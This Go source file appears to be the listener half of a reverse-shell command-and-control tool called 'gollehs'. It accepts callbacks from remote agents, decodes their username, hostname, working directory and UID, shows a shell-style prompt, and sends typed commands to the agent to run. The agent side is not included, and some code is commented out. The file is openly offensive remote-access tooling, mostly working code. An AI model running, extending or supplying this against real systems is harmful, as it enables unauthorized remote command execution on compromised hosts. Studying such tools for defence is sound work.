package main

import (
	"bufio"
	"encoding/gob"
	"fmt"
	"net"
	"os"
	"os/signal"
	"syscall"
	"time"

	"github.com/fatih/color"
	"github.com/s-christian/gollehs/lib/logger"
	"github.com/s-christian/gollehs/lib/utils"
	"github.com/s-christian/gollehs/types"
)

const (
	KeywordExit string = "EXIT"

	ExitSuccess int = 1
)

var (
	localIp, _  = net.ResolveIPAddr("ip4", "127.0.0.1")
	localPort   = "8000"
	localTcp, _ = net.ResolveTCPAddr("tcp", fmt.Sprintf("%s:%s", localIp.IP.String(), localPort))

	statusError   = color.New(color.BgRed, color.FgBlack, color.BlinkRapid)
	statusWarning = color.New(color.BgYellow, color.FgBlack, color.Bold)
	statusDone    = color.New(color.BgGreen, color.FgHiWhite, color.Italic)
)

func main() {
	listener, err := net.ListenTCP("tcp", localTcp)
	if err != nil {
		logger.LogError(err)
		return
	}

	logger.Logf(logger.Info, "Server listening on %s\n", listener.Addr().String())

	for {
		conn, err := listener.AcceptTCP()
		if err != nil {
			logger.Logf(logger.Error, "Listener could not accept connection on %s\n", listener.Addr().String())
			logger.LogError(err)
			continue
		}
		handleConnection(conn) // intentionally no concurrency (yet)
	}
}

func handleConnection(conn *net.TCPConn) {
	defer func() {
		utils.Close(conn)
		logger.Logf(logger.Warning, "Connection from %s closed\n", conn.RemoteAddr().String())
	}()

	logger.Logf(logger.List, "Connection from %s\n", conn.RemoteAddr().String())

	// Get initial callback info
	decoder := gob.NewDecoder(conn)
	agentCallback := &types.AgentCallback{}
	err := decoder.Decode(agentCallback)
	if err != nil {
		statusWarning.Printf("WARNING: Could not decode agent data | %s\n", err.Error())
	}

	// Catch CTRL+C
	c := make(chan os.Signal, 2)
	signal.Notify(c, os.Interrupt, syscall.SIGTERM)
	go func() {
		<-c
		_catchInterrupt(agentCallback)
	}()

	for {
		userInput, err := getUserInput(agentCallback)
		if err != nil {
			statusError.Printf("ERROR: Could not get user input | %s\n", err.Error())
			continue
		}

		// Send commands through connection for agent to execute
		conn.SetWriteDeadline(time.Now().Add(2 * time.Second))
		bytesSent, err := conn.Write([]byte(userInput))
		if err != nil {
			statusError.Printf("ERROR: Could not send command to agent! | %s\n", err.Error())
			continue
		}

		if bytesSent < len(userInput) {
			statusError.Printf("ERROR: Only sent %d of %d bytes to agent!\n", bytesSent, len(userInput))
			continue
		}

		//statusDone.Printf("Command sent! - '%s'\n", userInput)

		/*
			dataBuffer := make([]byte, 8192)
			err = conn.SetReadDeadline(time.Now().Add(5 * time.Second))
			if err != nil {
				logger.LogError(err)
				return
			}
		*/
	}

	/*
		numBytes, err := conn.Read(dataBuffer)
		if err != nil {
			logger.Logf(logger.Error, "No data read from %s, closing\n", conn.RemoteAddr().String())
			logger.LogError(err)
			return
		}

		logger.Logf(logger.Debug, "Data (%d bytes) is: '%s'\n", numBytes, string(dataBuffer))

		// Shouldn't ever technically be greater than, but adding just in case
		if numBytes >= len(dataBuffer) {
			logger.Log(logger.Warning, "Buffer is at maximum capacity, expect data to have been lost in transmission")
		}
	*/
}

/*
	Get command line input from the user.
*/
func getUserInput(agentCallback *types.AgentCallback) (string, error) {
	scanner := bufio.NewScanner(os.Stdin)

	for {
		_printPrompt(agentCallback)

		scanner.Scan()
		if err := scanner.Err(); err != nil {
			return "", err
		}

		input := scanner.Text()

		if len(input) != 0 {
			if input == KeywordExit {
				os.Exit(0)
			} else {
				return input, nil
			}
		}
	}
}

/*
	Print the command line prompt.

	"user@hostname:~/Documents/Projects/Go/gollehs$ "
*/
func _printPrompt(agentCallback *types.AgentCallback) {
	fmt.Printf("%s:%s",
		color.New(color.FgWhite, color.Bold).Sprintf("%s@%s", agentCallback.Username, agentCallback.Hostname),
		color.New(color.FgGreen, color.Italic).Sprint(agentCallback.Cwd),
	)

	// Root or non-root prompt symbols
	if agentCallback.UID == "0" {
		fmt.Print("# ")
	} else {
		fmt.Print("$ ")
	}
}

func _catchInterrupt(agentCallback *types.AgentCallback) {
	fmt.Println()
	statusWarning.Printf("Type %s to exit\n", KeywordExit)
	_printPrompt(agentCallback)
}
